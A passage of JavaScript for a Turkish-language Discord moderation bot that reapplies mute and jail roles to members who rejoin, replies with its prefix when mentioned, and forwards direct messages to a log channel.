let mute = member.guild.roles.cache.get(ayarlar.susturulmuş);
let mutelimi = await db.fetch(`muteli_${member.guild.id + member.id}`)
let süre = await db.fetch(`süre_${member.id + member.guild.id}`)
console.log(mutelimi)
console.log(süre)
if (!mutelimi) return
if (mutelimi == "muteli") {
member.roles.add(ayarlar.susturulmuş)
 
member.send("Muteliyken Sunucudan Çıktığın için Yeniden Mutelendin!")
 setTimeout(function(){
db.delete(`muteli_${member.guild.id + member.id}`)
    member.send(`<@${member.id}> Muten açıldı.`)
    member.roles.remove(ayarlar.susturulmuş);
  }, ms(süre));
}
});


client.on('guildMemberAdd', async(member) => {
let rol = member.guild.roles.cache.get(ayarlar.cezalı);
let cezalımı = await db.fetch(`cezali_${member.guild.id + member.id}`)
let sürejail = await db.fetch(`süreJail_${member.id + member.guild.id}`)
if (!cezalımı) return;
if (cezalımı == "cezali") {
member.roles.add(ayarlar.cezalı)
 
member.send("Cezalıyken Sunucudan Çıktığın için Yeniden Cezalı Rolü Verildi!")
 setTimeout(function(){
db.delete(`cezali_${member.guild.id + member.id}`)
    member.send(`<@${member.id}> Cezan açıldı.`)
    member.roles.remove(ayarlar.cezalı);
  }, ms(sürejail));
}
});




client.on('message', message => {
let prefix = ayarlar.prefix;
if (message.content === `<@${client.user.id}>`) {
 message.reply(`Prefix'im: **${prefix}**, Yardım için: **${prefix}yardım**`)
}
});


client.on("message", msg => {
var dm = client.channels.cache.get(ayarlar.dmlog)
if(msg.channel.type === "dm") {
if(msg.author.id === client.user.id) return;
const botdm = new Discord.MessageEmbed()
.setTitle(`${client.user.username} Dm`)
.setTimestamp()
.setColor("RED")
.setThumbnail(`${msg.author.avatarURL({dynamic: true})}`)
.addField("Gönderen", msg.author)
.addField("Gönderen ID", msg.author.id)
.addField("Gönderilen Mesaj", msg.content)

dm.send(botdm)

}
if(msg.channel.bot) return;
});